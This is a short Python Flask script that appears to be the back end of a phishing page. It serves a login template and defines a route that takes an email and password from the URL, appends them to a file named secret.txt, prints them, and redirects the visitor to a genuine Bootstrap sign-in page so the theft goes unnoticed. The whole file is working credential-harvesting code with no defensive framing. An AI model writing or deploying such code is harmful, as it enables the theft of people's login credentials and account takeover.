from flask import Flask, render_template, redirect

IP = 'localhost'
root = Flask(__name__, template_folder='page')

@root.route('/')
def index():
	return render_template('index.html')

@root.route('/cred/<email>/<passwd>')
def get_credentials(email, passwd):
	with open('secret.txt', 'a+') as file:
		file.write(f"{email}, {passwd}\n")
	print(email, passwd)
	return redirect('https://getbootstrap.com/docs/4.0/examples/signin/')

if __name__ == '__main__':
	root.run(host=IP, port=5000)
